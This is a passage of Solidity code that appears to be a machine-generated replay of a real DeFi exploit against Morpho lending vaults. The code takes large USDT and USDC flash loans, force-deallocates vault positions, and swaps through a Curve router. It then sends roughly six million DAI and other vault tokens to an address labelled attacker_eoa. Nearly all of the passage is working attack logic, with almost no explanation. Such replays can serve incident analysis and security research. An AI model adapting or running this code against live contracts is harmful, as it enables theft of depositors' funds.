                    field3: Addresses.AdaptiveCurveIrm,
                    field4: 860000000000000000
                })
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "market(bytes32)", bytes32(hex"d570c19c0dc0fbe4ab7faf4a37c4150e1c141c8aada8ca3e1b4b6c1b712af93d")
            )
        );
        IskyMoneyUsdcRiskCapital(Addresses.skyMoneyUsdcRiskCapital).liquidityAdapter();
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "position(bytes32,address)",
                bytes32(hex"d570c19c0dc0fbe4ab7faf4a37c4150e1c141c8aada8ca3e1b4b6c1b712af93d"),
                Addresses.MorphoMarketV1AdapterV2_8B41
            )
        );
        IskyMoneyUsdcRiskCapital(Addresses.skyMoneyUsdcRiskCapital).liquidityAdapter();
        bytes memory forceDeallocateProofChildFrameId533 = abi.encode(
            Addresses.USDC,
            Addresses.ERC1967Proxy,
            Addresses.MorphoChainlinkOracleV2_9DD0,
            Addresses.AdaptiveCurveIrm,
            uint256(860000000000000000)
        );
        IskyMoneyUsdcRiskCapital(Addresses.skyMoneyUsdcRiskCapital)
            .forceDeallocate(
                Addresses.MorphoMarketV1AdapterV2_8B41, forceDeallocateProofChildFrameId533, 283363402402, address(this)
            );

        IMorphoMarketV1AdapterV2_8B41(Addresses.MorphoMarketV1AdapterV2_8B41).marketIdsLength();
    }

    function _call5() internal {
        IContract_EBA9B3_7F8E(Addresses.A_EBA9B3_7F8E).vault();
        Igtusdcp(Addresses.gtusdcp).liquidityAdapter();
        IERC20Like(Addresses.gtusdcp).balanceOf(Addresses.A_EBA9B3_7F8E);
        Igtusdcp(Addresses.gtusdcp).convertToAssets(0);
        Igtusdcp(Addresses.gtusdcp).forceDeallocatePenalty(Addresses.A_DF62F5_A22F);
        IContract_DF62F5_A22F(Addresses.A_DF62F5_A22F).marketIdsLength();
    }

    function _call6() internal {
        IMorphoV2VaultArk_C7B5(Addresses.MorphoV2VaultArk_C7B5).vault();
        IAVGUSDCcons(Addresses.AVGUSDCcons).liquidityAdapter();
        IERC20Like(Addresses.AVGUSDCcons).balanceOf(Addresses.MorphoV2VaultArk_C7B5);
        IAVGUSDCcons(Addresses.AVGUSDCcons).convertToAssets(33995757006678351110039);
        IAVGUSDCcons(Addresses.AVGUSDCcons).forceDeallocatePenalty(Addresses.A_FBE454_ADF6);
        IERC20Like(Addresses.USDC).approve(Addresses.AVGUSDCcons, 182326261);
        uint256 aVGUSDCconsDepositAmount = 182326261; // value provenance: arg0=182326261 is covered by prior Addresses.AVGUSDCcons.balanceOf(address) return=33995757006678351110039 with args (Addresses.MorphoV2VaultArk_C7B5)
        IAVGUSDCcons(Addresses.AVGUSDCcons).deposit(aVGUSDCconsDepositAmount, address(this));
        IContract_FBE454_ADF6(Addresses.A_FBE454_ADF6).marketIdsLength();
        IContract_FBE454_ADF6(Addresses.A_FBE454_ADF6).marketIds(0);
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "idToMarketParams(bytes32)",
                bytes32(hex"64d65c9a2d91c36d56fbc42d69e979335320169b3df63bf92789e2c8883fcc64")
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "accrueInterest((address,address,address,address,uint256))",
                Abi_accrueInterest_Param0({
                    field0: Addresses.USDC,
                    field1: Addresses.FiatTokenProxy,
                    field2: Addresses.A_A6D695_182A,
                    field3: Addresses.AdaptiveCurveIrm,
                    field4: 860000000000000000
                })
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "market(bytes32)", bytes32(hex"64d65c9a2d91c36d56fbc42d69e979335320169b3df63bf92789e2c8883fcc64")
            )
        );
        IAVGUSDCcons(Addresses.AVGUSDCcons).liquidityAdapter();
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "position(bytes32,address)",
                bytes32(hex"64d65c9a2d91c36d56fbc42d69e979335320169b3df63bf92789e2c8883fcc64"),
                Addresses.A_FBE454_ADF6
            )
        );
        IAVGUSDCcons(Addresses.AVGUSDCcons).liquidityAdapter();
        bytes memory forceDeallocateProofChildFrameId380 = abi.encode(
            Addresses.USDC,
            Addresses.FiatTokenProxy,
            Addresses.A_A6D695_182A,
            Addresses.AdaptiveCurveIrm,
            uint256(860000000000000000)
        );
        IAVGUSDCcons(Addresses.AVGUSDCcons)
            .forceDeallocate(Addresses.A_FBE454_ADF6, forceDeallocateProofChildFrameId380, 34465252249, address(this));

        IContract_FBE454_ADF6(Addresses.A_FBE454_ADF6).marketIdsLength();
    }

    function _borrowFlashFunds() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.Morpho, 1000000000000);
        bytes memory flashLoanProof = abi.encode(Addresses.USDT);
        bytes memory helperData =
            abi.encodeWithSignature("flashLoan(address,uint256,bytes)", Addresses.USDT, 1000000000000, flashLoanProof);
        _decodedCall(Addresses.Morpho, helperData);
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        uint256 approveActionGraphAllowance = 6018729943078;
        IERC20Like(Addresses.USDC).approve(Addresses.CurveRouter_v1_2, approveActionGraphAllowance);
        ICurveRouter_v1_2(Addresses.CurveRouter_v1_2)
            .exchange(
                [
                    Addresses.USDC,
                    Addresses.Vyper_contract_BEBC44,
                    Addresses.DAI,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO
                ],
                [
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000001),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000001),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000001),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000003)
                    ],
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                    ],
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                    ],
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                    ],
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                    ]
                ],
                0x000000000000000000000000000000000000000000000000000005795842a026,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                [Addresses.Vyper_contract_BEBC44, Addresses.ZERO, Addresses.ZERO, Addresses.ZERO, Addresses.ZERO],
                address(this)
            );
        IERC20Like(Addresses.DAI).balanceOf(address(this));
        IERC20Like(Addresses.DAI).balanceOf(address(this));
        uint256 transferActionGraphAmount = 6016754998120906520734632;
        IERC20Like(Addresses.DAI).transfer(Addresses.attacker_eoa, transferActionGraphAmount);
        IERC20Like(Addresses.LVUSDC).balanceOf(address(this));
        IERC20Like(Addresses.LVUSDC).balanceOf(address(this));
        uint256 transferActionGraphAmount_2 = 20947675455;
        IERC20Like(Addresses.LVUSDC).transfer(Addresses.attacker_eoa, transferActionGraphAmount_2);
        IERC20Like(Addresses.LVUSDC_CB06).balanceOf(address(this));
        IERC20Like(Addresses.LVUSDC_CB06).balanceOf(address(this));
        uint256 transferActionGraphAmount_3 = 77697049639;
        IERC20Like(Addresses.LVUSDC_CB06).transfer(Addresses.attacker_eoa, transferActionGraphAmount_3);
        IERC20Like(Addresses.USDC).balanceOf(address(this));
    }

    function _call7() internal {
        IAdaptiveCurveIrm(Addresses.AdaptiveCurveIrm)
            .borrowRate(
                Abi_borrowRate_Param0({
                field0: Addresses.USDC,
                field1: Addresses.A_73E0C0_DB98,
                field2: Addresses.MorphoChainlinkOracleV2_D554,
                field3: Addresses.AdaptiveCurveIrm,
                field4: 860000000000000000
            }),
                Abi_borrowRate_Param1({
                field0: 100000000000,
                field1: 99868514701545153,
                field2: 90158,
                field3: 90016000000,
                field4: 1783301147,
                field5: 0
            })
            );
    }

    function _call8() internal {}

    function _call9() internal {
        IAdaptiveCurveIrm(Addresses.AdaptiveCurveIrm)
            .borrowRate(
                Abi_borrowRate_Param0({
                field0: Addresses.USDC,
                field1: Addresses.OETHProxy,
                field2: Addresses.A_E8ADFF_EDB0,
                field3: Addresses.AdaptiveCurveIrm,
                field4: 860000000000000000
            }),
                Abi_borrowRate_Param1({
                field0: 7897752083526,
                field1: 7685083419903386695,
                field2: 7108042770738,
                field3: 6894365669628212551,
                field4: 1783311071,
                field5: 0
            })
            );
    }

    function _call10() internal {
        IAdaptiveCurveIrm(Addresses.AdaptiveCurveIrm)
            .borrowRate(
                Abi_borrowRate_Param0({
                field0: Addresses.USDC,
                field1: Addresses.WstETH,
                field2: Addresses.MorphoChainlinkOracleV2,
                field3: Addresses.AdaptiveCurveIrm,
                field4: 860000000000000000
            }),
                Abi_borrowRate_Param1({
                field0: 1865393596607,
                field1: 1780828372779562267,
                field2: 1699476219630,
                field3: 1611438249228560608,
                field4: 1783301147,
                field5: 0
            })
            );
    }

    function _handleCallback() internal {
        _replayDone[REPLAY_CALLBACK_14] = true;
    }

    function _call11() internal {
        IAdaptiveCurveIrm(Addresses.AdaptiveCurveIrm)
            .borrowRate(
                Abi_borrowRate_Param0({
                field0: Addresses.USDC,
                field1: Addresses.FiatTokenProxy,
                field2: Addresses.MorphoChainlinkOracleV2_E40D,
                field3: Addresses.AdaptiveCurveIrm,
                field4: 860000000000000000
            }),
                Abi_borrowRate_Param1({
                field0: 3423674078564,
                field1: 3277875498322690148,
                field2: 3084258968090,
                field3: 2934702689335106755,
                field4: 1783301147,
                field5: 0
            })
            );
    }

    function _call12() internal {}

    function _call13() internal {
        IAdaptiveCurveIrm(Addresses.AdaptiveCurveIrm)
            .borrowRate(
                Abi_borrowRate_Param0({
                field0: Addresses.USDC,
                field1: Addresses.RocketTokenRETH,
                field2: Addresses.MorphoChainlinkOracleV2_F815,
                field3: Addresses.AdaptiveCurveIrm,
                field4: 860000000000000000
            }),
                Abi_borrowRate_Param1({
                field0: 2655781185138,
                field1: 2629957421783119476,
                field2: 2283355238679,
                field3: 2258350252438881901,
                field4: 1783265183,
                field5: 0
            })
            );
    }

    function _handleCallback2() internal {
        _replayDone[REPLAY_CALLBACK_18] = true;
    }

    function _call14() internal {}

    function _call15() internal {}

    function _call16() internal {}

    function _handleCallback3() internal {
        _replayDone[REPLAY_CALLBACK_22] = true;
    }

    function _call17() internal {}

    function _call18() internal {}

    function _call19() internal {}

    function _handleCallback4() internal {
        _replayDone[REPLAY_CALLBACK_26] = true;
    }

    function _call20() internal {}

    function _handleCallback5() internal {
        _replayDone[REPLAY_CALLBACK_28] = true;
    }

    function _handleCallback6() internal {
        _replayDone[REPLAY_CALLBACK_29] = true;
    }

    function _call21() internal {}

    function _handleCallback7() internal {
        _replayDone[REPLAY_CALLBACK_31] = true;
    }

    function _handleCallback8() internal {
        _replayDone[REPLAY_CALLBACK_32] = true;
    }

    function _call22() internal {}

    function _handleCallback9() internal {
        _replayDone[REPLAY_CALLBACK_34] = true;
    }

    function _call23() internal {}

    function _handleCallback10() internal {
        _replayDone[REPLAY_CALLBACK_36] = true;
        IERC20Like(Addresses.USDC).transfer(Addresses.MorphoMarketV1AdapterV2, 789709312788);
    }

    function _handleCallback11() internal {
        _replayDone[REPLAY_CALLBACK_37] = true;
        IERC20Like(Addresses.USDC).transfer(Addresses.MorphoMarketV1AdapterV2_E001, 165917376977);
    }

    function _handleCallback12() internal {
        _replayDone[REPLAY_CALLBACK_38] = true;
        IERC20Like(Addresses.USDC).transfer(Addresses.MorphoMarketV1AdapterV2, 1868812232296);
    }

    function _handleCallback13() internal {
        _replayDone[REPLAY_CALLBACK_39] = true;
        IERC20Like(Addresses.USDC).transfer(Addresses.MorphoMarketV1AdapterV2_8B41, 283363402402);
    }

    function _handleCallback14() internal {
        _replayDone[REPLAY_CALLBACK_40] = true;
        IERC20Like(Addresses.USDC).transfer(Addresses.MorphoMarketV1AdapterV2, 372425946459);
    }

    function _handleCallback15() internal {
        _replayDone[REPLAY_CALLBACK_41] = true;
        IERC20Like(Addresses.USDC).transfer(Addresses.MorphoMarketV1AdapterV2_E001, 339415110474);
    }

    function _handleCallback16() internal {
        _replayDone[REPLAY_CALLBACK_42] = true;
        IERC20Like(Addresses.USDC).transfer(Addresses.A_FBE454_ADF6, 34465252249);
    }

    function _handleCallback17() internal {
        _replayDone[REPLAY_CALLBACK_43] = true;
        IERC20Like(Addresses.USDC).transfer(Addresses.gtUSDC, 284184162322);
    }

    function _handleCallback18() internal {
        _replayDone[REPLAY_CALLBACK_44] = true;
        IERC20Like(Addresses.USDC).transfer(Addresses.MorphoMarketV1AdapterV2_E001, 464426763683);
    }

    function _handleCallback19() internal {
        _replayDone[REPLAY_CALLBACK_45] = true;
    }

    function _handleCallback20() internal {
        _replayDone[REPLAY_CALLBACK_46] = true;
    }

    function _handleCallback21() internal {
        _replayDone[REPLAY_CALLBACK_47] = true;
    }

    function _handleCallback22() internal {
        _replayDone[REPLAY_CALLBACK_48] = true;
    }

    function _handleCallback23() internal {
        _replayDone[REPLAY_CALLBACK_49] = true;
    }

    function _handleCallback24() internal {
        _replayDone[REPLAY_CALLBACK_50] = true;
    }

    function _call24() internal {}

    function _handleCallback25() internal {
        _replayDone[REPLAY_CALLBACK_52] = true;
    }

    function _handleCallback26() internal {
        _replayDone[REPLAY_CALLBACK_53] = true;
    }

    function _handleCallback27() internal {
        _replayDone[REPLAY_CALLBACK_54] = true;
    }

    function _handleCallback28() internal {
        _replayDone[REPLAY_CALLBACK_55] = true;
    }

    function _call25() internal {}

    function _handleCallback29() internal {
        _replayDone[REPLAY_CALLBACK_57] = true;
    }

    function _handleCallback30() internal {
        _replayDone[REPLAY_CALLBACK_58] = true;
    }

    function _handleCallback31() internal {
        _replayDone[REPLAY_CALLBACK_59] = true;
    }

    function _handleCallback32() internal {
        _replayDone[REPLAY_CALLBACK_60] = true;
    }

    function _call26() internal {}

    function _handleCallback33() internal {
        _replayDone[REPLAY_CALLBACK_62] = true;
    }

    function _handleCallback34() internal {
        _replayDone[REPLAY_CALLBACK_63] = true;
    }

    function _call27() internal {}

    function _handleCallback35() internal {
        _replayDone[REPLAY_CALLBACK_65] = true;
    }

    function _handleCallback36() internal {
        _replayDone[REPLAY_CALLBACK_66] = true;
    }

    function _handleCallback37() internal {
        _replayDone[REPLAY_CALLBACK_67] = true;
    }

    function _handleCallback38() internal {
        _replayDone[REPLAY_CALLBACK_68] = true;
    }

    function _handleCallback39() internal {
        _replayDone[REPLAY_CALLBACK_69] = true;
    }

    function _handleCallback40() internal {
        _replayDone[REPLAY_CALLBACK_70] = true;
    }

    function _handleCallback41() internal {
        _replayDone[REPLAY_CALLBACK_71] = true;
    }

    function _call28() internal {}

    function _handleCallback42() internal {
        _replayDone[REPLAY_CALLBACK_73] = true;
    }

    function _handleCallback43() internal {
        _replayDone[REPLAY_CALLBACK_74] = true;
    }

    function _call29() internal {}

    function _handleCallback44() internal {
        _replayDone[REPLAY_CALLBACK_76] = true;
    }

    function _handleCallback45() internal {
        _replayDone[REPLAY_CALLBACK_77] = true;
    }

    function _call30() internal {}

    function _handleCallback46() internal {
        _replayDone[REPLAY_CALLBACK_79] = true;
    }

    function _handleCallback47() internal {
        _replayDone[REPLAY_CALLBACK_80] = true;
    }

    function _handleCallback48() internal {
        _replayDone[REPLAY_CALLBACK_81] = true;
    }

    function _call31() internal {}

    function _handleCallback49() internal {
        _replayDone[REPLAY_CALLBACK_83] = true;
    }

    function _handleCallback50() internal {
        _replayDone[REPLAY_CALLBACK_84] = true;
    }

    function _handleCallback51() internal {
        _replayDone[REPLAY_CALLBACK_85] = true;
    }

    function _handleCallback52() internal {
        _replayDone[REPLAY_CALLBACK_86] = true;
    }

    function _handleCallback53() internal {
        _replayDone[REPLAY_CALLBACK_87] = true;
    }

    function _handleCallback54() internal {
        _replayDone[REPLAY_CALLBACK_88] = true;
    }

    function _handleCallback55() internal {
        _replayDone[REPLAY_CALLBACK_89] = true;
    }

    function _handleCallback56() internal {
        _replayDone[REPLAY_CALLBACK_90] = true;
    }

    function _handleCallback57() internal {
        _replayDone[REPLAY_CALLBACK_91] = true;
    }

    function _handleCallback58() internal {
        _replayDone[REPLAY_CALLBACK_92] = true;
    }

    function _handleCallback59() internal {
        _replayDone[REPLAY_CALLBACK_93] = true;
    }

    function _call32() internal {}

    function _call33() internal {}

    function _call34() internal {}

    function _call35() internal {}

    function _call36() internal {}

    function _call37() internal {}

    function _call38() internal {}

    function _call39() internal {}

    function _call40() internal {}

    function _handleCallback60() internal {
        _replayDone[REPLAY_CALLBACK_103] = true;
        IAdaptiveCurveIrm(Addresses.AdaptiveCurveIrm)
            .borrowRate(
                Abi_borrowRate_Param0({
                field0: Addresses.USDC,
                field1: Addresses.ERC1967Proxy,
                field2: Addresses.MorphoChainlinkOracleV2_9DD0,
                field3: Addresses.AdaptiveCurveIrm,
                field4: 860000000000000000
            }),
                Abi_borrowRate_Param1({
                field0: 18181825462450,
                field1: 17871640599914831978,
                field2: 16667329731630,
                field3: 16348772014212883036,
                field4: 1783314419,
                field5: 0
            })
            );
        IERC20Like(Addresses.USDC).transferFrom(Addresses.MorphoMarketV1AdapterV2_8B41, address(this), 576726804);
    }

    function _handleCallback61() internal {
        _replayDone[REPLAY_CALLBACK_104] = true;
        IAdaptiveCurveIrm(Addresses.AdaptiveCurveIrm)
            .borrowRate(
                Abi_borrowRate_Param0({
                field0: Addresses.USDC,
                field1: Addresses.WstETH,
                field2: Addresses.ChainlinkOracle,
                field3: Addresses.AdaptiveCurveIrm,
                field4: 860000000000000000
            }),
                Abi_borrowRate_Param1({
                field0: 30520700137331,
                field1: 26892675560401938628,
                field2: 26497530886736,
                field3: 22925382302797956291,
                field4: 1783314587,
                field5: 0
            })
            );
        IERC20Like(Addresses.USDC).transferFrom(Addresses.MorphoMarketV1AdapterV2_E001, address(this), 106975925);
    }

    function _handleCallback62() internal {
        _replayDone[REPLAY_CALLBACK_105] = true;
        IAdaptiveCurveIrm(Addresses.AdaptiveCurveIrm)
            .borrowRate(
                Abi_borrowRate_Param0({
                field0: Addresses.USDC,
                field1: Addresses.FiatTokenProxy,
                field2: Addresses.A_A6D695_182A,
                field3: Addresses.AdaptiveCurveIrm,
                field4: 860000000000000000
            }),
                Abi_borrowRate_Param1({
                field0: 287526607972137,
                field1: 265265547693837747277,
                field2: 249379180649336,
                field3: 227523790835989170715,
                field4: 1783314587,
                field5: 0
            })
            );
        IERC20Like(Addresses.USDC).transferFrom(Addresses.A_FBE454_ADF6, address(this), 182326261);
    }

    function _flashLoan3() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.attack_path_entry, 1000000000000);
        _decodedCall(
            Addresses.attack_path_entry,
            abi.encodeWithSignature(
                "onMorphoFlashLoan(uint256,bytes)",
                1000000000000,
                hex"000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7"
            )
        );
        IERC20Like(Addresses.USDT).transferFrom(Addresses.attack_path_entry, address(this), 1000000000000);
    }

    function _flashLoan4() internal {
        IERC20Like(Addresses.USDC).transfer(Addresses.attack_path_entry, 65419171879990);
        _decodedCall(
            Addresses.attack_path_entry,
            abi.encodeWithSignature(
                "onMorphoFlashLoan(uint256,bytes)",
                65419171879990,
                hex"000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
            )
        );
        IERC20Like(Addresses.USDC).transferFrom(Addresses.attack_path_entry, address(this), 65419171879990);
    }

    receive() external payable {}

    function accrueInterest(Abi_accrueInterest_Param0 calldata arg0) external payable {
        arg0;
        uint256 dispatchArg1Call7;
        assembly { dispatchArg1Call7 := calldataload(36) }
        if (dispatchArg1Call7 == 0x00000000000000000000000073e0c0d45e048d25fc26fa3159b0aa04bfa4db98) {
            _call7();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchArg1Call13;
        assembly { dispatchArg1Call13 := calldataload(36) }
        if (dispatchArg1Call13 == 0x000000000000000000000000ae78736cd615f374d3085123a210448e74fc6393) {
            _call13();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchArg1Call9;
        assembly { dispatchArg1Call9 := calldataload(36) }
        if (dispatchArg1Call9 == 0x000000000000000000000000856c4efb76c1d1ae02e20ceb03a2a6a08b0b8dc3) {
            _call9();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchArg1Call8;
        assembly { dispatchArg1Call8 := calldataload(36) }
        if (dispatchArg1Call8 == 0x00000000000000000000000099cd4ec3f88a45940936f469e4bb72a2a701eeb9) {
            _call8();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchOrdinal = _nextDispatch(0x151c1ade);
        if (dispatchOrdinal == 0) {
            _call10();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 1) {
            _call11();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 2) {
            _call12();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 3) {
            _call14();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 4) {
            _call15();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 5) {
            if (!_replayDone[REPLAY_CALLBACK_14]) _handleCallback();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 6) {
            if (!_replayDone[REPLAY_CALLBACK_18]) _handleCallback2();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _call10();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function tryBuyToken(uint256 amount) external payable {
        amount;
        _call();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000001b129194df942";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function idToMarketParams(bytes32 arg0) external payable {
        arg0;
        bytes memory ret =
            abi.encode(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, uint256(0), uint256(0), uint256(0), uint256(0));
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata arg1) external payable {
        amount;
        arg1;
        uint256 dispatchArg0FlashLoan2;
        assembly { dispatchArg0FlashLoan2 := calldataload(4) }
        if (dispatchArg0FlashLoan2 == 1000000000000) {
            _flashLoan2();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchArg0FlashLoan;
        assembly { dispatchArg0FlashLoan := calldataload(4) }
        if (dispatchArg0FlashLoan == 65419171879990) {
            _flashLoan();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _flashLoan2();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function withdraw(Abi_withdraw_Param0 calldata amount, uint256 amount1, uint256 amount2, address arg3, address arg4)
        external
        payable
    {
        amount;
        amount1;
        amount2;
        arg3;
        arg4;
        uint256 dispatchArg1HandleCallback11;
        assembly { dispatchArg1HandleCallback11 := calldataload(36) }
        if (dispatchArg1HandleCallback11 == 165917376977) {
            if (!_replayDone[REPLAY_CALLBACK_37]) _handleCallback11();
            bytes memory ret = abi.encode(uint256(165917376977), uint256(158392006237045655));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchArg1HandleCallback15;
        assembly { dispatchArg1HandleCallback15 := calldataload(36) }
        if (dispatchArg1HandleCallback15 == 339415110474) {
            if (!_replayDone[REPLAY_CALLBACK_41]) _handleCallback15();
            bytes memory ret = abi.encode(uint256(339415110474), uint256(324956527704647344));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchArg1HandleCallback18;
        assembly { dispatchArg1HandleCallback18 := calldataload(36) }
        if (dispatchArg1HandleCallback18 == 464426763683) {
            if (!_replayDone[REPLAY_CALLBACK_44]) _handleCallback18();
            bytes memory ret = abi.encode(uint256(464426763683), uint256(409219701635530448));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchArg1HandleCallback16;
        assembly { dispatchArg1HandleCallback16 := calldataload(36) }
        if (dispatchArg1HandleCallback16 == 34465252249) {
            if (!_replayDone[REPLAY_CALLBACK_42]) _handleCallback16();
            bytes memory ret = abi.encode(uint256(34465252249), uint256(31796846003076613));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchArg1HandleCallback14;
        assembly { dispatchArg1HandleCallback14 := calldataload(36) }
        if (dispatchArg1HandleCallback14 == 372425946459) {
            if (!_replayDone[REPLAY_CALLBACK_40]) _handleCallback14();
            bytes memory ret = abi.encode(uint256(372425946459), uint256(368782609752512326));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchArg1HandleCallback10;
        assembly { dispatchArg1HandleCallback10 := calldataload(36) }
        if (dispatchArg1HandleCallback10 == 789709312788) {
            if (!_replayDone[REPLAY_CALLBACK_36]) _handleCallback10();
            bytes memory ret = abi.encode(uint256(789709312788), uint256(768439478085638271));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchArg1HandleCallback12;
        assembly { dispatchArg1HandleCallback12 := calldataload(36) }
        if (dispatchArg1HandleCallback12 == 1868812232296) {
            if (!_replayDone[REPLAY_CALLBACK_38]) _handleCallback12();
            bytes memory ret = abi.encode(uint256(1868812232296), uint256(1724123019024352916));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchArg1HandleCallback13;
        assembly { dispatchArg1HandleCallback13 := calldataload(36) }
        if (dispatchArg1HandleCallback13 == 283363402402) {
            if (!_replayDone[REPLAY_CALLBACK_39]) _handleCallback13();
            bytes memory ret = abi.encode(uint256(283363402402), uint256(278528689042296178));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        uint256 dispatchArg1HandleCallback17;
        assembly { dispatchArg1HandleCallback17 := calldataload(36) }
        if (dispatchArg1HandleCallback17 == 284184162322) {
            if (!_replayDone[REPLAY_CALLBACK_43]) _handleCallback17();
            bytes memory ret = abi.encode(uint256(284184162322), uint256(262181747012402692));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (!_replayDone[REPLAY_CALLBACK_37]) _handleCallback11();
        bytes memory ret = abi.encode(uint256(165917376977), uint256(158392006237045655));
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function market(bytes32 arg0) external payable {
        arg0;
        bytes memory ret = abi.encode(
            uint256(2178797100568),
            uint256(2178797100568000000),
            uint256(0),
            uint256(0),
            uint256(1783313423),
            uint256(0)
        );
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function extSloads(bytes32[] calldata arg0) external payable {
        arg0;
        bytes memory ret = abi.encode(_uintArray1(0));
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function position(bytes32 arg0, address arg1) external payable {
        arg0;
        arg1;
        bytes memory ret = abi.encode(uint256(1484356655199885357), uint256(0), uint256(0));
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function supply(Abi_supply_Param0 calldata arg0, uint256 amount, uint256 amount1, address arg3, bytes calldata arg4)
        external
        payable
    {
        arg0;
        amount;
        amount1;
        arg3;
        arg4;
        if (msg.sender == 0x9414a42Eab4580C042b18deF4d37372A7881e001) {
            if (!_replayDone[REPLAY_CALLBACK_104]) _handleCallback61();
            bytes memory ret = abi.encode(uint256(106975925), uint256(94259546464391));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sender == 0xfBE454F609C5F54cefe3F486129f05Dfa081Adf6) {
            if (!_replayDone[REPLAY_CALLBACK_105]) _handleCallback62();
            bytes memory ret = abi.encode(uint256(182326261), uint256(168209998912802));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sender == 0xCc0F95e65d2ce7fB715bfb418Bf61314d0878b41) {
            if (!_replayDone[REPLAY_CALLBACK_103]) _handleCallback60();
            bytes memory ret = abi.encode(uint256(576726804), uint256(566886758459318));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (!_replayDone[REPLAY_CALLBACK_104]) _handleCallback61();
        bytes memory ret = abi.encode(uint256(106975925), uint256(94259546464391));
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashLoan(address arg0, uint256 amount, bytes calldata arg2) external payable {
        arg0;
        amount;
        arg2;
        uint256 dispatchArg0FlashLoan3;
        assembly { dispatchArg0FlashLoan3 := calldataload(4) }
        if (address(uint160(dispatchArg0FlashLoan3)) == 0xdAC17F958D2ee523a2206206994597C13D831ec7) {
            _flashLoan3();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
